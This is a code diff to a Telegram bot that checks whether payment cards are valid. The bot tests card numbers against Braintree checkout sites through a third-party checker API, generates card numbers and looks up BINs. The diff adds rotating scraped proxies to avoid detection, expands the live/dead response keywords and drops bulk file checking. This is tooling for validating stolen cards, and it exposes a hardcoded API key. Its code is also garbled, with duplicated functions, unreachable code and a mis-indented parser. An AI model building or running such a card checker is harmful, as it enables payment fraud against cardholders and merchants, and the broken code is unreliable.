@@ -20,7 +20,7 @@ ADMIN_ID = 5629984144
 bot = telebot.TeleBot(BOT_TOKEN, num_threads=10)
 
 USERS_FILE = 'users.json'
-MAX_WORKERS = 20  # For parallel processing
+MAX_WORKERS = 10
 
 def load_users():
     if os.path.exists(USERS_FILE):
@@ -43,68 +43,202 @@ def save_users():
 approved_users, pending_requests = load_users()
 
 ACTIVE_PROXY = None
+
+PROXY_LIST = []
+
+PROXY_API_URL = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all"
+
+def reload_proxies_from_api():
+    global PROXY_LIST
+    try:
+        res = requests.get(PROXY_API_URL, timeout=10)
+        if res.status_code == 200:
+            proxies = [p.strip() for p in res.text.splitlines() if p.strip()]
+            PROXY_LIST = proxies
+            print(f"🔄 Loaded {len(PROXY_LIST)} proxies from API")
+        else:
+            print("❌ Failed to load proxies from API")
+    except Exception as e:
+        print(f"Proxy API error: {e}")
+
+PROXY_INDEX = 0
+
+def load_proxies():
+    global PROXY_LIST
+    if os.path.exists("proxies.txt"):
+        with open("proxies.txt","r") as f:
+            PROXY_LIST = [p.strip() for p in f if p.strip()]
+
+def get_rotating_proxy():
+    global PROXY_INDEX, PROXY_LIST
+    if not PROXY_LIST:
+        return None
+
+    attempts = len(PROXY_LIST)
+    for _ in range(attempts):
+        proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
+        PROXY_INDEX += 1
+
+        parts = proxy.split(":")
+        if len(parts) == 4:
+            host, port, user, pw = parts
+            proxy_url = f"http://{user}:{pw}@{host}:{port}"
+            proxies = {'http': proxy_url, 'https': proxy_url}
+
+            try:
+                test = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=5)
+                if test.status_code == 200:
+                    return proxies
+            except:
+                # remove dead proxy
+                print(f"Removing dead proxy: {proxy}")
+                PROXY_LIST.remove(proxy)
+                if not PROXY_LIST:
+                    return None
+                continue
+
+    return None
+
+    proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
+    PROXY_INDEX += 1
+    parts = proxy.split(":")
+    if len(parts)==4:
+        host,port,user,pw = parts
+        return {'http':f"http://{user}:{pw}@{host}:{port}",'https':f"http://{user}:{pw}@{host}:{port}"}
+    return None
+
 PROXY_LOCK = threading.Lock()
 
 def test_proxy(proxy_url):
-    """Test proxy with multiple attempts"""
     test_urls = [
         'https://api.stripe.com',
-        'https://www.google.com',
         'https://httpbin.org/ip'
     ]
-    
+
     for test_url in test_urls:
         try:
             response = requests.get(
                 test_url,
                 proxies={'http': proxy_url, 'https': proxy_url},
-                timeout=10,
+                timeout=(5, 10),
                 verify=False
             )
-            if response.status_code in [200, 301, 302, 403, 404]:
+
+            if response.status_code in [200, 301, 302]:
                 return True
+
+        except requests.exceptions.ProxyError:
+            return False
+        except requests.exceptions.ConnectTimeout:
+            continue
+        except requests.exceptions.ReadTimeout:
+            continue
         except:
             continue
+
     return False
 
 def set_proxy(proxy_url):
     global ACTIVE_PROXY
-    
-    # Normalize proxy format
-    if '@' in proxy_url and not proxy_url.startswith('http'):
-        try:
-            parts = proxy_url.split('@')
-            if len(parts) == 2:
-                host_port = parts[0]
-                user_pass = parts[1]
-                proxy_url = f"http://{user_pass}@{host_port}"
-        except:
-            pass
-    
-    if not proxy_url.startswith('http://') and not proxy_url.startswith('https://'):
-        proxy_url = f"http://{proxy_url}"
-    
+
+    try:
+        parts = proxy_url.split(":")
+
+        if len(parts) == 4:
+            host, port, user, password = parts
+            proxy_url = f"http://{user}:{password}@{host}:{port}"
+        elif "@" not in proxy_url:
+            proxy_url = f"http://{proxy_url}"
+
+    except Exception as e:
+        return False, f"❌ Invalid proxy format: {e}"
+
     print(f"Testing proxy: {proxy_url}")
+
     if test_proxy(proxy_url):
         with PROXY_LOCK:
             ACTIVE_PROXY = proxy_url
         print(f"✅ Proxy set: {proxy_url}")
-        return True, "✅ Proxy is live and set successfully!"
-    
+        return True, "✅ Proxy is LIVE and working!"
+
     print(f"❌ Proxy failed: {proxy_url}")
-    return False, "❌ Proxy is dead or unreachable"
+    return False, "❌ Proxy is DEAD or too slow"
 
 def remove_proxy():
     global ACTIVE_PROXY
     with PROXY_LOCK:
         ACTIVE_PROXY = None
+
+PROXY_LIST = []
+
+PROXY_API_URL = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all"
+
+def reload_proxies_from_api():
+    global PROXY_LIST
+    try:
+        res = requests.get(PROXY_API_URL, timeout=10)
+        if res.status_code == 200:
+            proxies = [p.strip() for p in res.text.splitlines() if p.strip()]
+            PROXY_LIST = proxies
+            print(f"🔄 Loaded {len(PROXY_LIST)} proxies from API")
+        else:
+            print("❌ Failed to load proxies from API")
+    except Exception as e:
+        print(f"Proxy API error: {e}")
+
+PROXY_INDEX = 0
+
+def load_proxies():
+    global PROXY_LIST
+    if os.path.exists("proxies.txt"):
+        with open("proxies.txt","r") as f:
+            PROXY_LIST = [p.strip() for p in f if p.strip()]
+
+def get_rotating_proxy():
+    global PROXY_INDEX, PROXY_LIST
+    if not PROXY_LIST:
+        return None
+
+    attempts = len(PROXY_LIST)
+    for _ in range(attempts):
+        proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
+        PROXY_INDEX += 1
+
+        parts = proxy.split(":")
+        if len(parts) == 4:
+            host, port, user, pw = parts
+            proxy_url = f"http://{user}:{pw}@{host}:{port}"
+            proxies = {'http': proxy_url, 'https': proxy_url}
+
+            try:
+                test = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=5)
+                if test.status_code == 200:
+                    return proxies
+            except:
+                # remove dead proxy
+                print(f"Removing dead proxy: {proxy}")
+                PROXY_LIST.remove(proxy)
+                if not PROXY_LIST:
+                    return None
+                continue
+
+    return None
+
+    proxy = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
+    PROXY_INDEX += 1
+    parts = proxy.split(":")
+    if len(parts)==4:
+        host,port,user,pw = parts
+        return {'http':f"http://{user}:{pw}@{host}:{port}",'https':f"http://{user}:{pw}@{host}:{port}"}
+    return None
+
     return "✅ Proxy removed. Using direct connection."
 
 def get_proxies():
     with PROXY_LOCK:
         return {'http': ACTIVE_PROXY, 'https': ACTIVE_PROXY} if ACTIVE_PROXY else None
 
-DEFAULT_BRAINTREE_SITE = "https://www.coca-colastore.com"
+DEFAULT_BRAINTREE_SITE = "https://www.coca-colastore.com,https://www.asedeals.com,https://www.broderbund.com"
 JOSS_API = "https://b3.mr-checker.net/api/wpg.php"
 
 user_sessions = {}
@@ -113,7 +247,7 @@ stop_checking = {}
 user_custom_sites = {}
 COOLDOWN_CHECK = 5  # Reduced from 10
 COOLDOWN_MASS = 10  # Reduced from 20
-MAX_MASS_CARDS = 10
+MAX_MASS_CARDS = 5
 MAX_FILE_CARDS = 500
 HANDYAPI_KEY = "HAS-0YZN9rhQvH74X3Gu9BgVx0wyJns"
 
@@ -300,7 +434,7 @@ class BraintreeChecker:
         site_url = get_braintree_site(self.chat_id)
         
         # Retry logic for API calls
-        max_retries = 3
+        max_retries = 5
         for attempt in range(max_retries):
             try:
                 params = {
@@ -313,16 +447,16 @@ class BraintreeChecker:
                 response = self.session.get(
                     JOSS_API,
                     params=params,
-                    proxies=get_proxies(),
+                    proxies=get_rotating_proxy(),
                     verify=False,
-                    timeout=45
+                    timeout=(10,30)
                 )
                 
                 elapsed_time = round(time.time() - start_time, 2)
                 
                 if response.status_code != 200:
                     if attempt < max_retries - 1:
-                        time.sleep(1)
+                        time.sleep(2)
                         continue
                     return {
                         'status': 'error',
@@ -334,49 +468,37 @@ class BraintreeChecker:
                 
                 response_text = response.text.lower()
                 
-                # Parse response
-                if 'cvv' in response_text or 'security code' in response_text:
-                    return {
-                        'status': 'live_cvv',
-                        'message': 'Card Issuer Declined CVV',
-                        'icon': '⚠️',
-                        'card_info': card_info,
-                        'time': elapsed_time
-                    }
-                
-                if 'insufficient' in response_text or 'insufficient funds' in response_text:
-                    return {
-                        'status': 'insufficient',
-                        'message': 'Insufficient Funds',
-                        'icon': '💰',
-                        'card_info': card_info,
-                        'time': elapsed_time
-                    }
-                
-                if any(word in response_text for word in ['approved', 'success', 'authorized', 'thank you', 'payment successful']):
-                    return {
-                        'status': 'live',
-                        'message': 'Payment successful',
-                        'icon': '✅',
-                        'card_info': card_info,
-                        'time': elapsed_time
-                    }
-                
-                if any(word in response_text for word in ['declined', 'fraud', 'stolen', 'lost', 'invalid', 'rejected', 'processor declined']):
-                    message = 'Card Declined'
-                    if 'fraud' in response_text:
-                        message = 'Gateway Rejected: fraud'
-                    elif 'processor declined' in response_text:
-                        message = 'Processor Declined'
-                        
-                    return {
-                        'status': 'dead',
-                        'message': message,
-                        'icon': '❌',
-                        'card_info': card_info,
-                        'time': elapsed_time
-                    }
-                
+                # --- ADVANCED RESPONSE PARSER ---
+response_text = response.text.lower()
+
+dead_keywords = [
+    'declined','do not honor','lost card','stolen card','pickup card','restricted card',
+    'call issuer','expired card','invalid number','invalid card','incorrect number',
+    'no such issuer','transaction not allowed','payment not allowed','processing error',
+    'rejected','fraud','risk','security violation','authentication failed','card blocked',
+    'blocked','blacklist','not permitted','invalid cvc','invalid expiry','invalid exp',
+    'zip code mismatch','avs failed','avs mismatch','processor declined'
+]
+
+ccn_keywords = ['cvv','cvc','security code','incorrect cvc','cvv mismatch']
+funds_keywords = ['insufficient','not enough funds','balance low']
+live_keywords = ['approved','success','authorized','payment successful','thank you']
+
+if any(k in response_text for k in live_keywords):
+    return {'status':'live','message':'Payment successful','icon':'✅','card_info':card_info,'time':elapsed_time}
+
+elif any(k in response_text for k in funds_keywords):
+    return {'status':'insufficient','message':'Insufficient Funds','icon':'💰','card_info':card_info,'time':elapsed_time}
+
+elif any(k in response_text for k in ccn_keywords):
+    return {'status':'live_cvv','message':'CVV Mismatch','icon':'⚠️','card_info':card_info,'time':elapsed_time}
+
+elif any(k in response_text for k in dead_keywords):
+    return {'status':'dead','message':'Card Declined','icon':'❌','card_info':card_info,'time':elapsed_time}
+
+# fallback
+return {'status':'dead','message':'Card Declined','icon':'❌','card_info':card_info,'time':elapsed_time}
+
                 # Success if we got here
                 return {
                     'status': 'dead',
@@ -386,10 +508,10 @@ class BraintreeChecker:
                     'time': elapsed_time
                 }
                 
-            except requests.exceptions.Timeout:
+            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                 if attempt < max_retries - 1:
                     print(f"Timeout on attempt {attempt + 1}, retrying...")
-                    time.sleep(1)
+                    time.sleep(2)
                     continue
                 elapsed_time = round(time.time() - start_time, 2)
                 return {
@@ -402,7 +524,7 @@ class BraintreeChecker:
             except Exception as e:
                 if attempt < max_retries - 1:
                     print(f"Error on attempt {attempt + 1}: {e}, retrying...")
-                    time.sleep(1)
+                    time.sleep(2)
                     continue
                 elapsed_time = round(time.time() - start_time, 2)
                 print(f"Validation error: {e}")
@@ -449,7 +571,7 @@ def send_welcome(message):
         text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
         text += "💳 /bchk - Single card check\n"
         text += "📦 /bmass - Multiple cards check\n"
-        text += "📁 /bfile - Upload .txt file\n"
+        text += "  \n"
         text += "🔍 /bin - BIN lookup\n"
         text += "🎲 /gen - Generate cards\n"
         text += "🌍 /custom_site - Set your site\n"
@@ -686,7 +808,7 @@ def braintree_mass(message):
                     text += "╚════════════════════╝\n\n"
                     text += f"You generated {len(cards)} cards\n"
                     text += f"Max for /bmass: {MAX_MASS_CARDS}\n\n"
-                    text += "💡 Use /bfile for more cards"
+                    text += "💡 Use  for more cards"
                     send_safe(message.chat.id, text)
                     return
             else:
@@ -750,140 +872,6 @@ def braintree_mass(message):
         send_safe(message.chat.id, "❌ An error occurred. Please try again.")
 
 # Continue with remaining commands...
-@bot.message_handler(commands=['bfile'])
-@require_approval
-def request_braintree_file(message):
-    try:
-        text = "╔════════════════════╗\n"
-        text += "║  📁 UPLOAD FILE  ║\n"
-        text += "╚════════════════════╝\n\n"
-        text += "📤 Please upload .txt file\n"
-        text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        text += "📝 Format: card|mm|yy|cvv\n"
-        text += "📊 One card per line\n"
-        text += f"📈 Max: {MAX_FILE_CARDS} cards"
-        send_safe(message.chat.id, text)
-        user_sessions[message.chat.id] = {'awaiting_file': True}
-    except Exception as e:
-        print(f"bfile error: {e}")
-
-@bot.message_handler(content_types=['document'])
-@require_approval
-def handle_braintree_file(message):
-    try:
-        if message.chat.id not in user_sessions or not user_sessions[message.chat.id].get('awaiting_file'):
-            send_safe(message.chat.id, "❌ Please use /bfile command first")
-            return
-        
-        user_sessions[message.chat.id]['awaiting_file'] = False
-        
-        if not message.document.file_name.endswith('.txt'):
-            send_safe(message.chat.id, "❌ Please upload a .txt file")
-            return
-        
-        can_proceed, remaining = check_cooldown(message.chat.id, 'mass')
-        if not can_proceed:
-            text = f"⏳ Wait {remaining} seconds"
-            send_safe(message.chat.id, text)
-            return
-        
-        file_info = bot.get_file(message.document.file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
-        
-        cards_text = downloaded_file.decode('utf-8')
-        cards = [c.strip() for c in cards_text.split('\n') if c.strip() and '|' in c]
-        
-        if len(cards) > MAX_FILE_CARDS:
-            send_safe(message.chat.id, f"❌ Max {MAX_FILE_CARDS} cards\nYour file: {len(cards)} cards")
-            return
-        
-        if len(cards) == 0:
-            send_safe(message.chat.id, "❌ No valid cards found")
-            return
-        
-        stop_checking[message.chat.id] = False
-        
-        stop_markup = types.InlineKeyboardMarkup()
-        stop_markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{message.chat.id}"))
-        
-        status_msg = send_safe(message.chat.id, "⏳ Initializing...", reply_markup=stop_markup)
-        if not status_msg:
-            return
-        
-        checker = BraintreeChecker(message.chat.id)
-        results = []
-        live_count = cvv_count = low_funds_count = dead_count = 0
-        
-        # Use ThreadPoolExecutor for parallel checking
-        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-            future_to_card = {executor.submit(checker.validate_card, card): card for card in cards}
-            
-            for idx, future in enumerate(as_completed(future_to_card), 1):
-                if stop_checking.get(message.chat.id, False):
-                    executor.shutdown(wait=False)
-                    break
-                
-                card = future_to_card[future]
-                try:
-                    result = future.result()
-                    results.append((card, result))
-                    
-                    if result['status'] == 'live':
-                        live_count += 1
-                    elif result['status'] == 'live_cvv':
-                        cvv_count += 1
-                    elif result['status'] == 'insufficient':
-                        low_funds_count += 1
-                    else:
-                        dead_count += 1
-                    
-                    # Update every 5 cards to reduce API calls
-                    if idx % 5 == 0 or idx == len(cards):
-                        progress_percent = int((idx / len(cards)) * 100)
-                        bar_length = 20
-                        filled_length = int(bar_length * idx // len(cards))
-                        bar = '█' * filled_length + '░' * (bar_length - filled_length)
-                        
-                        progress_msg = f"📊 <b>CHECKING...</b>\n\n"
-                        progress_msg += f"✅ Live: <code>{live_count}</code>\n"
-                        progress_msg += f"⚠️ CVV: <code>{cvv_count}</code>\n"
-                        progress_msg += f"💰 Low: <code>{low_funds_count}</code>\n"
-                        progress_msg += f"❌ Dead: <code>{dead_count}</code>\n\n"
-                        progress_msg += f"<code>[{bar}]</code>\n"
-                        progress_msg += f"<b>{progress_percent}%</b> • {idx}/{len(cards)}"
-                        
-                        edit_safe(message.chat.id, status_msg.message_id, progress_msg, parse_mode='HTML', reply_markup=stop_markup)
-                except Exception as e:
-                    print(f"File check error: {e}")
-                    results.append((card, {'status': 'error', 'message': 'Error', 'icon': '❌'}))
-        
-        was_stopped = stop_checking.get(message.chat.id, False)
-        stop_checking[message.chat.id] = False
-        
-        file_response = "╔════════════════════════════╗\n"
-        file_response += f"║   {'🛑 STOPPED' if was_stopped else '✅ COMPLETE'}   ║\n"
-        file_response += "╚════════════════════════════╝\n\n"
-        file_response += f"📥 Total: <code>{len(results)}</code>\n"
-        file_response += f"✅ Live: <code>{live_count}</code>\n"
-        file_response += f"⚠️ CVV: <code>{cvv_count}</code>\n"
-        file_response += f"💰 Low: <code>{low_funds_count}</code>\n"
-        file_response += f"❌ Dead: <code>{dead_count}</code>\n\n"
-        
-        if live_count > 0 or cvv_count > 0 or low_funds_count > 0:
-            file_response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            file_response += "🎯 <b>LIVE CARDS</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            for card, result in results:
-                if result['status'] in ['live', 'live_cvv', 'insufficient']:
-                    file_response += f"{result['icon']} <code>{card}</code>\n└ <i>{result['message']}</i>\n\n"
-        
-        file_response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        file_response += f"👤 @{message.from_user.username or 'User'}"
-        
-        edit_safe(message.chat.id, status_msg.message_id, file_response, parse_mode='HTML')
-    except Exception as e:
-        print(f"File handler error: {e}")
-        send_safe(message.chat.id, f"❌ Error: {str(e)[:50]}")
-
 @bot.message_handler(commands=['bin'])
 @require_approval
 def check_bin(message):
@@ -1143,7 +1131,7 @@ def send_help(message):
         help_text = "📚 <b>COMMANDS</b>\n\n"
         help_text += "💳 /bchk card|mm|yy|cvv\n"
         help_text += "📦 /bmass [cards]\n"
-        help_text += "📁 /bfile\n"
+        help_text += " \n"
         help_text += "🔍 /bin 453212\n"
         help_text += "🎲 /gen 453212 5\n\n"
         help_text += "✨ Fast & Reliable!"
